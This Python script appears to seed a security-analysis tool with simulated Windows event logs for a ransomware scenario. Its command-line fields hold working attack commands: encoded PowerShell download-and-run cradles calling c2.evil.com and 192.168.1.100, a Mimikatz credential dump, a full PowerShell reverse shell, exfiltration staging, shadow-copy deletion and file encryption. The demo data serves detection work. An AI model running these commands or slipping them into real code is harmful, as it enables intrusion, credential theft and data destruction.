#!/usr/bin/env python3
"""
CyberLens Database Seeder

Generates sample security events for demonstration and testing.
Creates realistic attack scenarios with EVTX, Sysmon, and Firewall logs.

Usage:
    python scripts/seed.py
"""

import json
import os
import random
import sys
from datetime import datetime, timedelta
from typing import Dict, List

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from app.core.config import settings
from app.core.database import SessionLocal, engine, Base
from app.models.normalized_event import NormalizedEvent
from app.models.project import Project
from app.models.user import User
from app.services.correlation_service import CorrelationService
from app.services.mitre_service import MitreService

SCENARIOS = {
    "ransomware": {
        "name": "Ransomware Attack Simulation",
        "events": [
            {"event_id": "4624", "event_name": "Successful Logon", "computer": "DC-01", "user": "j.smith", "ip": "10.0.1.50", "severity": "info", "delta": 0},
            {"event_id": "4624", "event_name": "Successful Logon", "computer": "DC-01", "user": "j.smith", "ip": "10.0.1.50", "severity": "info", "delta": 5},
            {"event_id": "4672", "event_name": "Admin Logon", "computer": "DC-01", "user": "j.smith", "ip": "10.0.1.50", "severity": "high", "delta": 10},
            {"event_id": "4688", "event_name": "Process Created", "computer": "DC-01", "user": "j.smith", "process": "cmd.exe", "parent": "explorer.exe", "cmdline": "cmd.exe /c whoami", "severity": "medium", "delta": 15},
            {"event_id": "4688", "event_name": "Process Created", "computer": "DC-01", "user": "j.smith", "process": "powershell.exe", "parent": "cmd.exe", "cmdline": "powershell -enc SQBFAFgAIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAG0AbAB5AG4AZwByAHkALgBjAG8AbQAvAGEAJwApAA==", "severity": "high", "delta": 20},
            {"event_id": "4688", "event_name": "Process Created", "computer": "DC-01", "user": "j.smith", "process": "mshta.exe", "parent": "powershell.exe", "cmdline": "mshta.exe javascript:new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://c2.evil.com/payload.ps1\\\")\"',0,false);close();", "severity": "critical", "delta": 25},
            {"event_id": "4688", "event_name": "Process Created", "computer": "WEB-01", "user": "SYSTEM", "process": "powershell.exe", "parent": "services.exe", "cmdline": "powershell -nop -w hidden -ep bypass -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQAJwApAA==", "severity": "critical", "delta": 60},
            {"event_id": "5156", "event_name": "Connection Made", "computer": "DC-01", "ip": "192.168.1.100", "severity": "high", "delta": 30},
            {"event_id": "5156", "event_name": "Connection Made", "computer": "WEB-01", "ip": "10.0.1.100", "severity": "medium", "delta": 65},
            {"event_id": "7036", "event_name": "Service Started", "computer": "WEB-01", "service": "WinRM", "severity": "medium", "delta": 70},
            {"event_id": "4624", "event_name": "Successful Logon", "computer": "WEB-01", "user": "admin_svc", "ip": "10.0.1.50", "severity": "high", "delta": 75},
            {"event_id": "4688", "event_name": "Process Created", "computer": "WEB-01", "user": "admin_svc", "process": "rundll32.exe", "parent": "svchost.exe", "cmdline": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -c \"Get-Process | Select-Object Name,Id | ConvertTo-Json | Out-File C:\\Windows\\Temp\\procs.txt\"');", "severity": "critical", "delta": 80},
            {"event_id": "4688", "event_name": "Process Created", "computer": "WEB-01", "user": "admin_svc", "process": "powershell.exe", "parent": "rundll32.exe", "cmdline": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCredits\"", "severity": "critical", "delta": 85},
            {"event_id": "4688", "event_name": "Process Created", "computer": "WEB-01", "user": "admin_svc", "process": "powershell.exe", "parent": "powershell.exe", "cmdline": "powershell -nop -w hidden -c \"Invoke-Command -ComputerName SQL-01 -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')}\"", "severity": "critical", "delta": 90},
            {"event_id": "4624", "event_name": "Successful Logon", "computer": "SQL-01", "user": "sa_backup", "ip": "10.0.1.100", "severity": "high", "delta": 95},
            {"event_id": "4688", "event_name": "Process Created", "computer": "SQL-01", "user": "sa_backup", "process": "powershell.exe", "parent": "sqlservr.exe", "cmdline": "powershell -nop -w hidden -c \"$c=New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\"", "severity": "critical", "delta": 100},
            {"event_id": "5156", "event_name": "Connection Made", "computer": "SQL-01", "ip": "192.168.1.100", "severity": "critical", "delta": 102},
            {"event_id": "4688", "event_name": "Process Created", "computer": "SQL-01", "user": "sa_backup", "process": "escript.bat", "parent": "powershell.exe", "cmdline": "echo 'SELECT * FROM sys.databases' | sqlcmd -S localhost -E > C:\\Users\\sa_backup\\Desktop\\databases.txt", "severity": "high", "delta": 105},
            {"event_id": "4688", "event_name": "Process Created", "computer": "SQL-01", "user": "sa_backup", "process": "powershell.exe", "parent": "powershell.exe", "cmdline": "powershell -nop -w hidden -c \"Compress-Archive -Path C:\\Users\\sa_backup\\Desktop\\ -DestinationPath C:\\Windows\\Temp\\exfil.zip -Force\"", "severity": "high", "delta": 110},
            {"event_id": "FW_BLOCK", "event_name": "Firewall Block", "computer": "FW-01", "src_ip": "10.0.1.100", "dst_ip": "192.168.1.100", "severity": "critical", "delta": 111},
            {"event_id": "5157", "event_name": "Connection Blocked", "computer": "SQL-01", "ip": "192.168.1.100", "severity": "critical", "delta": 112},
            {"event_id": "4688", "event_name": "Process Created", "computer": "DC-01", "user": "j.smith", "process": "vssadmin.exe", "parent": "powershell.exe", "cmdline": "vssadmin.exe Delete Shadows /All /Quiet", "severity": "critical", "delta": 120},
            {"event_id": "4688", "event_name": "Process Created", "computer": "WEB-01", "user": "admin_svc", "process": "vssadmin.exe", "parent": "powershell.exe", "cmdline": "vssadmin.exe Delete Shadows /All /Quiet", "severity": "critical", "delta": 125},
            {"event_id": "4688", "event_name": "Process Created", "computer": "SQL-01", "user": "sa_backup", "process": "vssadmin.exe", "parent": "powershell.exe", "cmdline": "vssadmin.exe Delete Shadows /All /Quiet", "severity": "critical", "delta": 130},
            {"event_id": "4688", "event_name": "Process Created", "computer": "DC-01", "user": "j.smith", "process": "powershell.exe", "parent": "powershell.exe", "cmdline": "powershell -nop -w hidden -c \"$e=Get-WmiObject Win32_EncryptableVolume -Namespace root\\cimv2\\Security\\MicrosoftVolumeEncryption -ComputerName .; foreach($v in $e){$v.ProtectKeyWithNumericalPassword('12345678-1234-1234-1234-123456789012')}; Get-ChildItem -Path C:\\Users\\*,C:\\Shares\\* -Recurse -Include *.docx,*.xlsx,*.pdf,*.pptx,*.sql,*.bak | ForEach-Object {$_.Encrypt()}\"", "severity": "critical", "delta": 135},
            {"event_id": "4688", "event_name": "Process Created", "computer": "WEB-01", "user": "admin_svc", "process": "cscript.exe", "parent": "cmd.exe", "cmdline": "cscript.exe C:\\Windows\\Temp\\enc.vbs", "severity": "critical", "delta": 140},
            {"event_id": "4688", "event_name": "Process Created", "computer": "SQL-01", "user": "sa_backup", "process": "cscript.exe", "parent": "cmd.exe", "cmdline": "cscript.exe C:\\Windows\\Temp\\enc.vbs", "severity": "critical", "delta": 145},
            {"event_id": "5156", "event_name": "Connection Made", "computer": "DC-01", "ip": "192.168.1.100", "severity": "high", "delta": 150},
            {"event_id": "4698", "event_name": "Scheduled Task Created", "computer": "DC-01", "user": "j.smith", "severity": "high", "delta": 155},
        ]
    }
}


def seed_database():
    Base.metadata.create_all(bind=engine)
    db = SessionLocal()

    try:
        admin = db.query(User).filter(User.username == "admin").first()
        if not admin:
            print("No admin user found. Run docker compose up first.")
            return

        project = db.query(Project).filter(Project.name == "Demo Investigation").first()
        if not project:
            print("No demo project found. Run docker compose up first.")
            return

        existing = db.query(NormalizedEvent).filter(NormalizedEvent.project_id == project.id).count()
        if existing > 0:
            print(f"Project already has {existing} events. Skipping seed.")
            return

        scenario = SCENARIOS["ransomware"]
        base_time = datetime.utcnow() - timedelta(hours=2)

        events = []
        for evt in scenario["events"]:
            ts = base_time + timedelta(seconds=evt["delta"])
            events.append(NormalizedEvent(
                project_id=project.id,
                upload_id=1,
                event_id=evt["event_id"],
                event_name=evt["event_name"],
                timestamp=ts,
                source_type="evtx",
                source_name="Microsoft-Windows-Security-Auditing",
                computer_name=evt.get("computer", "Unknown"),
                user_name=evt.get("user", ""),
                ip_address=evt.get("ip", ""),
                process_name=evt.get("process", ""),
                parent_process=evt.get("parent", ""),
                command_line=evt.get("cmdline", ""),
                severity=evt.get("severity", "info"),
                raw_data=evt,
            ))

        for event in events:
            db.add(event)
        db.commit()

        print(f"Seeded {len(events)} events for scenario: {scenario['name']}")
    finally:
        db.close()


if __name__ == "__main__":
    seed_database()
